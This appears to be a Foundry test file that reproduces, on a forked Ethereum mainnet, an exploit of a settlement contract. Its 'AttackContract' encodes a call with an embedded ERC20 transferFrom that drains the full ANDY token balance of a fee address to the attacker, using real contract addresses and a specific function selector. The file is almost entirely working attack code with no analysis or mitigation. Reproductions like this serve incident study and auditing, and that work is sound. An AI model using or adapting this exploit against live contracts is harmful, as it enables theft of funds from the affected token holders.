// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import {IERC20} from "./IERC20.sol";

struct AllowedSlippage {
    address payable recipient;
    IERC20 buyToken;
    uint256 minAmountOut;
}

interface IMainnetSettler {
    function execute(
        AllowedSlippage calldata slippage,
        bytes[] calldata actions,
        bytes32 data
    ) external payable returns (bool);
}

address constant MAINNET_SETTLER = 0xDf31A70a21A1931e02033dBBa7DEaCe6c45cfd0f;
address constant COINBASE_FEE = 0x382fFCe2287252F930E1C8DC9328dac5BF282bA1;
address constant ANDY = 0x68BbEd6A47194EFf1CF514B50Ea91895597fc91E;

// forge test --fork-url wss://eth.drpc.org --fork-block-number 23134256 -vvv
contract CoinbaseTest is Test {
    function testExploit() public {
        AttackContract attackContract = new AttackContract();
        attackContract.attack();
    }
}

contract AttackContract is Test {
    function attack() public {
        AllowedSlippage memory slippage = AllowedSlippage({
            recipient: payable(address(0)),
            buyToken: IERC20(address(0)),
            minAmountOut: 0
        });
        bytes[] memory actions = new bytes[](1);
        uint256 amount = IERC20(ANDY).balanceOf(COINBASE_FEE);

        console.log("Balance ANDY:", amount);

        bytes memory action = buildData(
            0,
            10000,
            ANDY,
            0,
            COINBASE_FEE,
            msg.sender,
            amount
        );
        actions[0] = action;

        IMainnetSettler(MAINNET_SETTLER).execute(slippage, actions, "");

        assertEq(IERC20(ANDY).balanceOf(COINBASE_FEE), 0);
    }

    function buildData(
        uint256 arg0,
        uint256 arg1,
        address target,
        uint256 arg3,
        address from,
        address to,
        uint256 amount
    ) public pure returns (bytes memory) {
        // Encode the inner ERC20 transferFrom call
        bytes memory inner = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,uint256)")),
            from,
            to,
            amount
        );

        // Encode the outer function call
        bytes memory data = abi.encodeWithSelector(
            bytes4(0x38c9c147),
            arg0,
            arg1,
            target,
            arg3,
            inner
        );
        return data;
    }
}
